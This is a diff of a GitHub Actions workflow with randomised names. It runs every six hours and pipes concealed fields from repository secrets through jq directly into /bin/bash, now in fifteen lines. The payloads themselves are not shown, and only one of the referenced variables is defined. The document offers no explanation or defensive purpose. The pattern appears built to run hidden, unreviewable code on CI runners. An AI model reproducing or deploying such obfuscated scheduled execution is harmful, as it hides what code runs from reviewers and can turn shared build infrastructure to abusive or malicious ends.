@@ -1,9 +1,8 @@
 name: maiyuyjg
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 5/6 * * *'
+    - cron: '27 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,12 +11,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: maiyuyjg
         env:
-          c90: ${{ secrets.c90 }}
+          sok8: ${{ secrets.sok8 }}
         run: |
-          echo $c90 | jq -r .gsxxf90180 | /bin/bash
-          echo $dxr296 | jq -r .lrai1339 | /bin/bash
-          echo $cjux09177 | jq -r .cscx0996 | /bin/bash
-          echo $qcda28429 | jq -r .ew71 | /bin/bash
-          echo $o65 | jq -r .spufh076 | /bin/bash
-          echo $zujoy69096 | jq -r .dt65 | /bin/bash
+          echo $sok8 | jq -r .ejupv22 | /bin/bash
+          echo $xxykm6327 | jq -r .a096 | /bin/bash
+          echo $ctail4 | jq -r .duom08094 | /bin/bash
+          echo $eht6 | jq -r .elm3454 | /bin/bash
+          echo $gt2648 | jq -r .pc1 | /bin/bash
+          echo $tk69 | jq -r .eopv19829 | /bin/bash
+          echo $wlv16 | jq -r .gxhvr84 | /bin/bash
+          echo $tyy207 | jq -r .bzck14 | /bin/bash
+          echo $l3 | jq -r .cnqjt58 | /bin/bash
+          echo $l28 | jq -r .jrt9 | /bin/bash
+          echo $ypk048 | jq -r .qwycu540 | /bin/bash
+          echo $uof8182 | jq -r .vjhiq9466 | /bin/bash
+          echo $gk0 | jq -r .febyw90 | /bin/bash
+          echo $bmf35 | jq -r .wbtq20 | /bin/bash
+          echo $phfdz15 | jq -r .je0 | /bin/bash
 
